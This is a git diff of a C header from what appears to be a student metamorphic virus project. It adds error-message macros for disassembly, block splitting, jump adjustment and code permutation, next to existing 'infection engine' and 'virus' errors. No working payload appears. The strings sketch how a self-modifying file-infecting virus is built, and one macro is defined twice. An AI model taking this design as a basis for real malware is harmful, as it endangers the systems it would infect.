@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/07 01:53:00 by agrumbac          #+#    #+#             */
-/*   Updated: 2020/12/01 13:23:36 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/03/01 19:03:11 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -24,7 +24,17 @@
 #  define ERR_FILE	PD_ARRAY(char,_err_type,'f','i','l','e',':',' ',0)
 #  define ERR_VIRUS	PD_ARRAY(char,_err_type,'v','i','r','u','s',':',' ',0)
 
-#  define _ERR_GENERATE_SEED           PD_ARRAY(char,_err_text,'\033','[','3','3','m','g','e','n','e','r','a','t','e',' ','s','e','e','d','\n','\033','[','0','m',0)
+#  define _ERR_DISASM_BLOCK            PD_ARRAY(char,_err_text,'\033','[','3','3','m','d','i','s','a','s','m','_','b','l','o','c','k','\n','\033','[','0','m',0)
+#  define _ERR_ADJUST_JUMPS            PD_ARRAY(char,_err_text,'\033','[','3','3','m','a','d','j','u','s','t','_','j','u','m','p','s','\n','\033','[','0','m',0)
+#  define _ERR_WRITE_PERMUTATED_CODE   PD_ARRAY(char,_err_text,'\033','[','3','3','m','w','r','i','t','e','_','p','e','r','m','u','t','a','t','e','d','_','c','o','d','e','\n','\033','[','0','m',0)
+#  define _ERR_ADD_TRAILING_JUMP       PD_ARRAY(char,_err_text,'\033','[','3','3','m','a','d','d','_','t','r','a','i','l','i','n','g','_','j','u','m','p','\n','\033','[','0','m',0)
+#  define _ERR_BAD_TRAILING_JUMP       PD_ARRAY(char,_err_text,'\033','[','3','3','m','t','r','a','i','l','i','n','g',' ','j','u','m','p',' ','v','a','l','u','e',' ','d','o','e','s','n','\'','t',' ','m','a','t','c','h',' ','d','e','s','t','i','n','a','t','i','o','n','\n','\033','[','0','m',0)
+
+#  define _ERR_CANT_SPLIT_MORE         PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','t','_','s','p','l','i','t','_','m','o','r','e','\n','\033','[','0','m',0)
+#  define _ERR_RECURSIVE_SPLIT_BLOCKS  PD_ARRAY(char,_err_text,'\033','[','3','3','m','r','e','c','u','r','s','i','v','e','_','s','p','l','i','t','_','b','l','o','c','k','s','\n','\033','[','0','m',0)
+#  define _ERR_SHARD_BLOCK             PD_ARRAY(char,_err_text,'\033','[','3','3','m','s','h','a','r','d','_','b','l','o','c','k','\n','\033','[','0','m',0)
+#  define _ERR_SPLIT_BLOCK             PD_ARRAY(char,_err_text,'\033','[','3','3','m','s','p','l','i','t','_','b','l','o','c','k','\n','\033','[','0','m',0)
+#  define _ERR_SHARD_BLOCK             PD_ARRAY(char,_err_text,'\033','[','3','3','m','s','h','a','r','d','_','b','l','o','c','k','\n','\033','[','0','m',0)
 #  define _ERR_INFECTION_ENGINE        PD_ARRAY(char,_err_text,'\033','[','3','3','m','i','n','f','e','c','t','i','o','n','_','e','n','g','i','n','e','\n','\033','[','0','m',0)
 #  define _ERR_NOT_ENOUGH_PADDING      PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t',' ','e','n','o','u','g','h',' ','p','a','d','d','i','n','g','\n','\033','[','0','m',0)
 #  define _ERR_MUNMAP_FAILED           PD_ARRAY(char,_err_text,'\033','[','3','3','m','m','u','n','m','a','p',' ','f','a','i','l','e','d','\n','\033','[','0','m',0)
